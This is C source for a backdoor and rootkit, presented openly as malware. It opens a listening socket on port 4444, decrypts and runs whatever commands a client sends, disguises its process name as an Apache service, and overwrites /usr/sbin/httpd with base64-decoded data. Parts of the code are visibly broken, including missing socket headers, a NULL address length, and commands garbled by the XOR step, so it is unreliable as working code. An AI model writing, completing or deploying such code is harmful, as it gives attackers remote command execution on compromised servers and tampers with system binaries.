#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define BACKDOOR_PORT 4444
#define ROOTKIT_NAME "apache_service"

const char* key = "thisisaverystrongencryptionkey";

void decrypt(char* buffer) {
  int i;
  for (i = 0; i < strlen(buffer); i++) {
    buffer[i] ^= key[i % strlen(key)];
  }
}

void backdoor() {
  int sockfd, connfd;
  struct sockaddr_in servaddr, cli;

  // Create socket
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1) {
    printf("Error creating socket\n");
    return;
  }

  memset(&servaddr, 0, sizeof(servaddr));

  // Assign IP and Port
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servaddr.sin_port = htons(BACKDOOR_PORT);

  // Bind the socket with the server address
  if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0) {
    printf("Error binding socket\n");
    return;
  }

  // Listen for incoming connections
  if ((listen(sockfd, 5)) != 0) {
    printf("Error listening for connections\n");
    return;
  }

  // Accept the data packet from client and verify connection
  connfd = accept(sockfd, (struct sockaddr*)&cli, NULL);
  if (connfd < 0) {
    printf("Error accepting connection\n");
    return;
  }

  // Execute command received from client
  char command[1024];
  memset(command, 0, sizeof(command));
  read(connfd, command, sizeof(command));
  decrypt(command);
  system(command);

  close(sockfd);
  close(connfd);
}

int main(int argc, char **argv) {
  // Set process name to rootkit name
  memset(argv[0], 0, strlen(argv[0]));
  strncpy(argv[0], ROOTKIT_NAME, strlen(ROOTKIT_NAME));

  // Fork process to create backdoor
  if (fork() == 0) {
    // Set up the backdoor
    backdoor();
  }

  // Run normal Apache service
  srand(time(NULL));
  int randnum = rand() % 4;
  char cmd[1024];
  if (randnum == 0) {
    sprintf(cmd, "echo %s | base64 -d > /usr/sbin/httpd", "cHJpbnQgL1Vzci9zaG91bGQvaHR0cGQ=");
  } else if (randnum == 1) {
    sprintf(cmd, "echo %s | base64 -d > /usr/sbin/httpd", "cHJpbnQgL1Vzci9zaG91bGQvc2VydmljZQ==");
  } else if (randnum == 2) {
    sprintf(cmd, "echo %s | base64 -d > /usr/sbin/httpd", "cHJpbnQgL1Vzci9zaG91bGQvYmFzaAo=");
 
  } else {
  sprintf(cmd, "echo %s | base64 -d > /usr/sbin/httpd", "cHJpbnQgL1Vzci9zaG91bGQvcmVhZG9ubHkK");
  }
  
  decrypt(cmd);
  system(cmd);
  
  // Sleep for a few seconds to let the backdoor start up
  sleep(5);
  
  // Keep running the Apache service
  while (1) {
    // Generate a random number to determine which version of the code to use
      int randnum = rand() % 4;
  
    // Call different functions based on the random number
    if (randnum == 0) {
      printf("Using version 0\n");
      // Version 0: do nothing
    } else if (randnum == 1) {
      printf("Using version 1\n");
      // Version 1: add a random string to the end of the code
      char randstr[32];
      sprintf(randstr, "randstr%d", rand() % 1000);
      printf("%s\n", randstr);
    } else if (randnum == 2) {
      printf("Using version 2\n");
      // Version 2: encrypt a string and print it out
      char* str = "Hello, world!";
      char encrypted[1024];
      memset(encrypted, 0, sizeof(encrypted));
      memcpy(encrypted, str, strlen(str));
      decrypt(encrypted);
      printf("%s\n", encrypted);
    } else {
      printf("Using version 3\n");
      // Version 3: generate a random number and print it out
      int randnum = rand() % 1000;
      printf("%d\n", randnum);
    }
    
    // Sleep for a random amount of time
    int sleep_time = rand() % 10;
    sleep(sleep_time);
    }

return 0;
}